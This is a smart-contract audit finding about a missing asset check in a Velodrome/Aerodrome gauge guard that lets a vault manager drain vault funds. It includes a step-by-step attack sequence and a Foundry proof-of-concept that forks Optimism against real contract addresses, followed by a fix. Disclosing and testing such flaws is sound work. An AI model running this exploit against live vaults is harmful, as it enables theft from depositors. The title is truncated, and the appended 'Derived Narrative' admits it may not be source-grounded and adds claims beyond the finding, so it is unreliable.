---
id: 22936
severity: "High"
---

# AerodromeCLGaugeContractGuardallows the man-

## Description

The lack of checks in the functions deposit and withdraw within the AerodromeCLGaugeContractGuard allows the manager to drain the Vault by withdrawing liquidity from Velodrome and receiving unsupported tokens, which the manager can later steal. When a Vault wants to interact with a Velodrome gauge, a contract guard ensures that only certain functions can be called with the correct arguments. However, the lack of checks in the guard for the functions deposit and withdraw allows the manager to drain the Vault by following this attack sequence:
1. The manager uses the Vault to mint a liquidity NFT from a CLPool (e.g. WETH-USDC) through NonFungiblePositionManager::mint.
2. The manager uses the Vault to decrease liquidity from that NFT through NonFungiblePositionManager::decreaseLiquidity.
3. The manager removes the assets USDC and WETH from being supported in the Vault.
4. The manager uses the Vault to deposit that NFT into the gauge through CLGauge::deposit.
After executing step 4, the Vault will receive the liquidity that was removed in step 2, but those tokens won't be accounted for in the Vault's total value because the USDC and WETH tokens have been removed from the supported assets list. The root cause of this issue is that the deposit and withdraw functions within the CLGauge contract are internally calling NonFungiblePositionManager::collect, which will send the previously withdrawn tokens to the receiver, which will be the Vault. But those functions do not check that the tokens are supported by the Vault, so a manager can make those tokens unsupported and thus steal them from the Vault's users.
If we take a look at Velodrome guards, we can see that this check is performed when the Vault calls collect directly:
```solidity
} else if (method == IVelodromeNonfungiblePositionManager.collect.selector) {
    IVelodromeNonfungiblePositionManager.CollectParams memory collectParams = abi.decode(
        params,
        (IVelodromeNonfungiblePositionManager.CollectParams)
    );
    (, , address token0, address token1, , , , , , , , ) = nonfungiblePositionManager.positions(
        collectParams.tokenId
    );
    require(poolManagerLogicAssets.isSupportedAsset(token0), "unsupported asset: tokenA");
    require(poolManagerLogicAssets.isSupportedAsset(token1), "unsupported asset: tokenB");
```
But on the other hand, this check is not performed when the Vaults calls deposit and withdraw, which internally will call collect:
```solidity
if (method == IVelodromeCLGauge.deposit.selector) {
    uint256 tokenId = abi.decode(params, (uint256));
    _validateTokenId(nonfungiblePositionManagerGuard, tokenId, poolLogic);
    txType = uint16(TransactionType.VelodromeCLStake);
} else if (method == IVelodromeCLGauge.withdraw.selector) {
    uint256 tokenId = abi.decode(params, (uint256));
    _validateTokenId(nonfungiblePositionManagerGuard, tokenId, poolLogic);
    txType = uint16(TransactionType.VelodromeCLUnstake);
```
By using this attack path, the manager of a Vault can reduce the Vault's token price to almost zero because all funds used in this attack will become untracked at the end of it. After step 4, the manager can steal those untracked tokens by swapping them and allowing 100% slippage. Usually, if a manager wants the Vault to perform a swap using 1Inch, some checks ensure that the slippage cannot be high to protect the user's funds. This is checked at SlippageAccumulator::updateSlippageImpact: s/utils/SlippageAccumulator.sol#L89
```solidity
function updateSlippageImpact(SwapData calldata swapData) external onlyContractGuard(swapData.to) {
    if (IHasSupportedAsset(swapData.poolManagerLogic).isSupportedAsset(swapData.srcAsset)) {
    }
}
```
However, as the code snippet is showing, the slippage of a swap won't be checked if the token being swapped is not supported by the Vault. Using this, a manager can trade all the untracked WETH and USDC allowing all the slippage, and can sandwich that transaction by extracting the maximum value out of that swap.

## Proof of Concept

The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_gauge. Additionally, you must have the following lines in the .env file in order for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
```solidity
pragma solidity 0.8.13;
import {Test} from "forge-std/Test.sol";
interface IVelodromeNonfungiblePositionManager {
    struct DecreaseLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }
    function ownerOf(uint256 tokenId) external view returns (address);
    function positions(uint256 tokenId) external view returns (uint96, address, address, address, int24, int24, int24, uint128, uint256, uint256, uint128, uint128);
    function decreaseLiquidity(DecreaseLiquidityParams calldata params) external;
    function approve(address to, uint256 tokenId) external;
}
interface ICLGauge {
    function deposit(uint256 tokenId) external;
}
interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}
interface IPoolManagerLogic {
    struct Asset {
        address asset;
        bool isDeposit;
    }
    function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;
    function totalFundValue() external view returns (uint256);
}
contract VelodromeTest is Test {
    IVelodromeNonfungiblePositionManager veloManager = IVelodromeNonfungiblePositionManager(0xbB5DFE1380333CEE4c2EeBd7202c80dE2256AdF4);
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    ICLGauge gauge = ICLGauge(0x8d8d1CdDD5960276A1CDE360e7b5D210C3387948);
    IPoolManagerLogic manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    address usdc = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
    address weth = 0x4200000000000000000000000000000000000006;
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121164040); // Jun-09-2024 09:54:17 AM +UTC
    }
    function test_gauge() public {
        // Right now the Vault has an NFT for the Velodrome pool CL100 WETH-USDC, not staked in the gauge
        uint256 tokenId = 50383;
        assert(veloManager.ownerOf(tokenId) == address(pool));
        // We get rid of the leftovers USDC and WETH the Vault is holding (for simplicity)
        deal(address(usdc), address(pool), 0);
        deal(address(weth), address(pool), 0);
        // Get the total liquidity of this NFT
        (,,,,,,, uint128 liquidity,,,,) = veloManager.positions(tokenId);
        // Decrease most of the liquidity
        IVelodromeNonfungiblePositionManager.DecreaseLiquidityParams memory params = IVelodromeNonfungiblePositionManager.DecreaseLiquidityParams({
            tokenId: tokenId,
            liquidity: liquidity - 10,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });
        bytes memory data = abi.encodeWithSelector(veloManager.decreaseLiquidity.selector, params);
        vm.prank(managerAddress);
        pool.execTransaction(address(veloManager), data);
        // Remove USDC and WETH as supported assets from the pool
        address[] memory removeAssets = new address[](2);
        removeAssets[0] = address(usdc);
        removeAssets[1] = address(weth);
        vm.prank(managerAddress);
        manager.changeAssets(new IPoolManagerLogic.Asset[](0), removeAssets);
        // Approve the gauge to spend the NFT
        bytes memory data3 = abi.encodeWithSelector(veloManager.approve.selector, address(gauge), tokenId);
        vm.prank(managerAddress);
        pool.execTransaction(address(veloManager), data3);
        uint256 totalFundValueBefore = manager.totalFundValue();
        // Now, stake the NFT in the gauge
        bytes memory data4 = abi.encodeWithSelector(gauge.deposit.selector, tokenId);
        vm.prank(managerAddress);
        pool.execTransaction(address(gauge), data4);
        uint256 totalFundValueAfter = manager.totalFundValue();
        // The total value deposited in the Vault falls drastically because the USDC and WETH are now untracked.
        assertEq(totalFundValueBefore, 33.940946395141082838e18); // BEFORE: 33 USD
        assertEq(totalFundValueAfter, 0.745044450895786687e18); // AFTER: 0.74 USD
    }
}
```
As the test shows, the manager can drain all funds from the Vault. After the last step, the manager can simply recover those USDC and WETH by executing a swap through 1Inch, allowing 100% slippage, which will pass because USDC and WETH aren't supported assets. Take into account that the test shows a loss of 33 USD because that was the total deposited value in that testing Vault, but a manager can use this bug to empty any Vault that is currently under its control.

## Recommendation

To mitigate this issue is recommended to ensure that both tokens from the liquidity pool are supported by the Vault before calling deposit and withdraw.
```solidity
if (method == IVelodromeCLGauge.deposit.selector) {
    uint256 tokenId = abi.decode(params, (uint256));
    _validateTokenId(nonfungiblePositionManagerGuard, tokenId, poolLogic);
    (, , address token0, address token1, , , , , , , , ) = IVelodromeNonfungiblePositionManager(nonfungiblePositionManager).positions(tokenId);
    require(IHasSupportedAsset(poolManagerLogic).isSupportedAsset(token0));
    require(IHasSupportedAsset(poolManagerLogic).isSupportedAsset(token1));
    txType = uint16(TransactionType.VelodromeCLStake);
} else if (method == IVelodromeCLGauge.withdraw.selector) {
    uint256 tokenId = abi.decode(params, (uint256));
    _validateTokenId(nonfungiblePositionManagerGuard, tokenId, poolLogic);
    (, , address token0, address token1, , , , , , , , ) = IVelodromeNonfungiblePositionManager(nonfungiblePositionManager).positions(tokenId);
    require(IHasSupportedAsset(poolManagerLogic).isSupportedAsset(token0));
    require(IHasSupportedAsset(poolManagerLogic).isSupportedAsset(token1));
    txType = uint16(TransactionType.VelodromeCLUnstake);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the AerodromeCLGaugeContractGuard implementation of the deposit and withdraw functions for a concentrated‑liquidity (CL) gauge. The guard is supposed to enforce that only supported assets can be moved in or out of a vault, but the deposit and withdraw paths call the NonFungiblePositionManager.collect method without verifying that the two tokens underlying the liquidity position (token0 and token1) are still listed as supported assets in the vault’s asset registry. Because the guard does not perform this check, a vault manager who can modify the supported‑asset list can deliberately remove the tokens that belong to a given CL position, then deposit the NFT into the gauge. When the gauge internally calls collect, the withdrawn tokens are transferred to the vault, but the vault’s accounting logic ignores them because they are no longer recognised as supported assets. Consequently the vault’s reported total fund value drops dramatically while the NFT remains staked, creating a situation where users see their NFT still present but the underlying USDC and WETH have effectively vanished. The manager can then swap the untracked tokens through a 1Inch router with 100 % slippage, because the slippage‑accumulator check also skips unsupported assets. The attack sequence is: (1) mint a CL NFT via the NonFungiblePositionManager, (2) decrease liquidity on that NFT, (3) remove the two underlying tokens from the vault’s supported‑asset list, (4) deposit the NFT into the gauge, (5) collect the withdrawn tokens which become untracked, and (6) swap the untracked tokens with unlimited slippage, draining the vault’s value. This flaw was discovered during a security audit when the code paths for deposit and withdraw were compared with the collect guard, revealing the missing asset‑validation step. The issue is hard to notice because the vault UI may still display the NFT as staked and the drop in total value can be mistaken for market movement, while no explicit error is emitted. To remediate, the guard must query the vault’s asset registry for both token0 and token1 before allowing deposit or withdraw, mirroring the checks performed for direct collect calls, and the slippage‑protection logic should be applied to any token transferred from the gauge regardless of its supported‑asset status. This class of bug is an asset‑validation omission that leads to accounting bypass and fund‑drain via unsupported token handling.
